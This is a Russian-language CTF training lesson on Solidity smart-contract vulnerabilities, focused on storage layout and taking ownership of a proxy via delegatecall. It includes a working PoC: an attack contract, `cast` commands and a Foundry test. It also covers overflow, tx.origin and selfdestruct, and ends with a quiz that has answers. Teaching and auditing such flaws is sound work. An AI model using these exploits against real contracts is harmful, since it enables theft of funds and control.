---
id: misc-blockchain-solidity
title: "Solidity: уязвимости смарт-контрактов"
category: misc
parent: misc-blockchain
difficulty: hard
order: 1
tags: [solidity, evm, smart-contract, overflow, delegatecall, tx-origin, ctf]
prerequisites: [misc-blockchain]
useful_for:
  - "CTF Blockchain категория"
  - "Аудит смарт-контрактов"
  - "Bug bounty Web3"
estimated_minutes: 35
summary: "Модель EVM, типы и видимость в Solidity, integer overflow, delegatecall, tx.origin, selfdestruct и контроль доступа — с полными примерами и PoC."
---

## Вопрос, с которого всё начинается

В CTF-задаче по блокчейну почти всегда одна формулировка: «дан контракт — переведи его баланс на себя» или «сделай так, чтобы `isSolved()` вернул true». У тебя есть адрес, исходник контракта и RPC. С чего начать? Этот урок — практический минимум по уязвимостям Solidity: разберём один контракт и на нём увидим, как читать «приватные» данные и как захватить владение через `delegatecall`.

## Наш пример: контракт, где надо стать owner

Дано:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Proxy {
    address public implementation; // слот 0
    address public owner;          // слот 1
    constructor(address impl) {
        implementation = impl;
        owner = msg.sender;
    }
    fallback() external payable {
        (bool ok, ) = implementation.delegatecall(msg.data);
        require(ok);
    }
}
```

`Solidity` — язык смарт-контрактов Ethereum; `контракт` — это аккаунт с кодом и балансом. `Proxy` хранит адрес `implementation` и `owner`. Цель: стать `owner`. Чтобы понять, как, разберёмся, где вообще лежат эти переменные.

## Storage: где лежат данные

У каждого контракта есть **storage** — постоянное хранилище из 256-битных слотов, пронумерованных с нуля. Переменные раскладываются по слотам **по порядку объявления**: `implementation` попадёт в слот 0, `owner` — в слот 1. Это ключевой факт: адрес переменной в storage — не «секрет», а следствие порядка.

Модификатор `public` у переменной создаёт авто-геттер — функцию, которую можно вызвать извне. `private` убирает геттер, но **не** делает данные недоступными: блокчейн публичен, и любой может прочитать слот напрямую. Это первое, что делают в CTF.

## private не значит приватный: читаем слоты

Проверяем слоты контракта через `cast` (CLI-инструмент Foundry для запросов к блокчейну):

```bash
$ cast storage 0xPROXY 0 --rpc-url $RPC
0x0000000000000000000000001234...   # implementation
$ cast storage 0xPROXY 1 --rpc-url $RPC
0x000000000000000000000000dead...   # owner
```

Мы прочитали «приватную» раскладку, ничего не взламывая. Запомни: секретов в storage нет — есть только данные, которые лениво читать вручную.

## Как читать mapping и массивы

Со скалярами просто, но у `mapping` (словарь `ключ → значение`) и динамических массивов раскладка хитрее. `mapping` не хранит данные в своём слоте — слот лишь «база», а значение лежит по адресу `keccak256(key . slot)`. Динамический массив — по `keccak256(slot)`. Поэтому «прочитать» mapping вручную сложнее: нужно посчитать хеш ключа и слота. Компилятор также **упаковывает** несколько маленьких переменных в один слот, что важно при ручном чтении. Точную раскладку всегда печатает `solc --storage-layout`, а проверить — `cast storage`.

## delegatecall: выполняем чужой код в своём storage

Теперь ключ к задаче. `delegatecall` — это вызов, при котором код берётся из другого контракта, но исполняется **в контексте вызывающего**: storage, `msg.sender` и `msg.value` — от `Proxy`. В `fallback` (функция, срабатывающая при неизвестном вызове) `Proxy` делает `implementation.delegatecall(msg.data)`. Значит, любой вызов, который мы отправим `Proxy`, выполнится как код `implementation`, но запишет в storage **Proxy**.

Если `implementation` указывает на контракт с функцией `pwn`, которая пишет в слот 1, мы перезапишем `owner`:

```solidity
contract Attack {
    function pwn() external {
        assembly { sstore(1, caller()) } // слот 1 = msg.sender
    }
}
```

`sstore(1, caller())` — низкоуровневая инструкция EVM «записать в слот 1 значение вызывающего». `assembly` — вставка байткода напрямую, в обход проверок компилятора.

## Захватываем владение (PoC)

Отправляем вызов `pwn()` на адрес `Proxy` и проверяем результат:

```bash
$ cast send 0xPROXY "pwn()" --private-key $PK --rpc-url $RPC
$ cast call 0xPROXY "owner()(address)"
0x...наш_адрес
```

Мы стали владельцем: `delegatecall` исполнил `pwn` в storage `Proxy`, записав наш адрес в слот 1 (`owner`). В Foundry то же самое оформляют тестом:

```solidity
function testTakeover() public {
    address(proxy).call(abi.encodeWithSignature("pwn()"));
    assertEq(Proxy(proxy).owner(), address(this));
}
```

Ключ — понимать **раскладку storage**: `owner` в слоте 1. Поменялся бы порядок объявления — поменялся бы и слот.

## Соседние грабли: overflow, tx.origin, selfdestruct

Те же принципы лежат в основе других классических багов.

**Integer overflow/underflow.** До Solidity 0.8.0 арифметика не проверялась: `uint8(0) - 1` давало `255`. В 0.8+ компилятор вставляет проверки и вызывает `revert`, но блок `unchecked { … }` их отключает. Тогда при `amount > balance` вычитание даёт гигантское число, и следующий вывод проходит:

```solidity
unchecked { balances[msg.sender] -= amount; } // если amount > balance → огромное число
```

**tx.origin как авторизация.** `msg.sender` — тот, кто вызвал контракт непосредственно; `tx.origin` — внешний инициатор всей цепочки. Проверка `require(tx.origin == owner)` — ловушка: если владелец вызовет атакующий контракт, тот внутри дёрнет функцию, и `tx.origin` будет адресом владельца. Правильно — `require(msg.sender == owner)`.

**selfdestruct.** Уничтожает контракт и отправляет весь баланс указанному адресу. Им можно принудительно «накачать» контракт эфиром, сломав логику вида `address(this).balance == 0`.

## Каталог уязвимостей и версии компилятора

Соберём типовые баги в одну таблицу — это шпаргалка, к которой возвращаются при аудите:

| Уязвимость | Суть | Защита |
|-----------|------|--------|
| Integer overflow | Арифметика выходит за диапазон | Solidity ≥0.8, `SafeMath`, осторожный `unchecked` |
| Reentrancy | Внешний вызов до обновления состояния | checks-effects-interactions, reentrancy guard |
| delegatecall | Чужой код в своём storage | Неподменяемый адрес реализации |
| tx.origin | Авторизация по внешнему адресу | Использовать `msg.sender` |
| Access control | Нет/слабая проверка прав | `onlyOwner`, `initializer`, роли |
| Weak randomness | `block.timestamp`/`blockhash` как случайность | Commit-reveal, VRF |

Важно и то, что уязвимости зависят от **версии компилятора** (`pragma`). До 0.8.0 нет проверок переполнения — нужен `SafeMath`. В upgradable-контрактах без модификатора `initializer` функцию инициализации можно вызвать повторно и захватить владение. А inline `assembly` обходит проверки компилятора и часто содержит баги при работе со слотами. При аудите всегда смотрите `pragma` и наличие `assembly` — там прячутся самые неожиданные ошибки.

## Что мы теперь знаем

- Storage — слоты по 256 бит, переменные раскладываются **по порядку объявления**.
- `private` убирает только геттер; данные всё равно читаются через `cast storage`.
- `delegatecall` исполняет чужой код **в storage вызывающего** — так подменяют `owner`.
- `unchecked` отключает проверки переполнения; `tx.origin` — плохая авторизация.
- `selfdestruct` умеет принудительно перевести эфир на контракт.

## Квиз

Проверь себя.

```quiz
- question: "Что означает модификатор `private` для переменной Solidity?"
  options:
    - "Нет авто-геттера, но значение видно в storage"
    - "Переменную нельзя прочитать никому, включая через RPC"
    - "Переменная хранится в calldata"
    - "Она доступна только конструктору"
  answer: 0
  explanation: "Все данные блокчейна публичны; private лишь убирает геттер."
- question: "Почему delegatecall в прокси опасен при подменяемом адресе реализации?"
  options:
    - "Чужой код исполняется в storage вызывающего и может перезаписать owner"
    - "Он всегда дороже обычного call"
    - "Он не поддерживает payable"
    - "Он блокирует слот 0"
  answer: 0
  explanation: "Контекст (storage/msg.sender) остаётся от прокси."
- question: "Какое условие авторизации корректно?"
  options:
    - "require(msg.sender == owner)"
    - "require(tx.origin == owner)"
    - "require(block.coinbase == owner)"
    - "require(gasleft() > 0)"
  answer: 0
  explanation: "msg.sender — непосредственный вызывающий, его нельзя подделать через промежуточный контракт."
- question: "Когда integer underflow в Solidity 0.8+ возможен?"
  options:
    - "Внутри блока unchecked или при сужении типа"
    - "Всегда"
    - "Только в view-функциях"
    - "Никогда"
  answer: 0
  explanation: "0.8 вставляет проверки, но unchecked их отключает."
- question: "Что делает selfdestruct?"
  options:
    - "Отправляет весь баланс контракта указанному адресу и удаляет код"
    - "Удаляет storage всех пользователей"
    - "Паузит контракт"
    - "Меняет owner"
  answer: 0
  explanation: "Это способ и уничтожить контракт, и принудительно перевести эфир."
```

## Куда дальше

В следующем уроке `misc-blockchain-tools` мы поднимем локальную ноду и научимся воспроизводить такие атаки в Foundry. А пока главное: в Solidity уязвимость почти всегда — это неверное представление о том, **где лежат данные и кто их контролирует**. Возьми Ethernaut и пройди первые уровни локально, читая storage через `cast storage`.

## Где пригодится

- **CTF:** категория Blockchain — от чтения контракта до PoC-эксплойта.
- **Аудит:** реальный аудит Solidity-проектов, отчёты.
- **Bug bounty:** Immunefi и Web3-программы.
- **Работа:** безопасность DeFi, разбор инцидентов.
